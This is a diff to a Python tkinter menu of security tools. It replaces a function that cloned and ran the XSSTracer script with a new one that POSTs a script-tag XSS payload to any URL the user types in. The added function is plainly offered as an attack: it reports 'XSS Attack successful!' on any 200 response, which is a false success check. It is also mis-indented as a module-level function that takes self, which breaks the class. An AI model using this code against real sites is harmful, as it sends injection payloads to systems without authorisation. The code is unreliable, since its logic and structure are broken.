@@ -2,6 +2,7 @@ import tkinter as tk
 from tkinter import simpledialog, messagebox
 import subprocess
 import os
+import requests
 
 class MenuGUI:
     def __init__(self, root):
@@ -62,14 +63,31 @@ class MenuGUI:
             report_file.write("</body></html>")
         messagebox.showinfo("Report Generated", f"HTML report for {category} has been generated: {report_filename}")
 
-    def xsstracer_function(self):
-        self.clearScr()
-        print("XSSTracer is a small python script that checks remote web servers for Clickjacking, Cross-Frame Scripting, Cross-Site Tracing and Host Header Injection.")
-        subprocess.run(["git", "clone", "https://github.com/padac78/XSSTracer"])
-        self.clearScr()
-        xsstracerchoice = simpledialog.askstring("XSS Tracer", "Select a Target:")
-        if xsstracerchoice:
-            subprocess.run(["python", "XSSTracer/xsstracer.py", xsstracerchoice, "80"])
+
+
+def perform_xss_attack(self):
+    url = simpledialog.askstring("XSS Tracer", "Enter the URL to perform XSS attack on:")
+    if url:
+        # Définir le payload XSS
+        payload = "<script>alert('XSS Attack!')</script>"
+
+        # Créer les données du formulaire avec le payload XSS
+        form_data = {
+            "input_field": payload
+        }
+
+        try:
+            # Envoyer la requête POST avec les données du formulaire
+            response = requests.post(url, data=form_data)
+
+            # Vérifier si la requête a réussi
+            if response.status_code == 200:
+                print("XSS Attack successful!")
+            else:
+                print("XSS Attack failed. Status code:", response.status_code)
+        except requests.exceptions.RequestException as e:
+            print("An error occurred:", e)
+
 
     def wpscan_scan(self):
         site_url = simpledialog.askstring("Wordpress", "Enter the Wordpress site URL:")
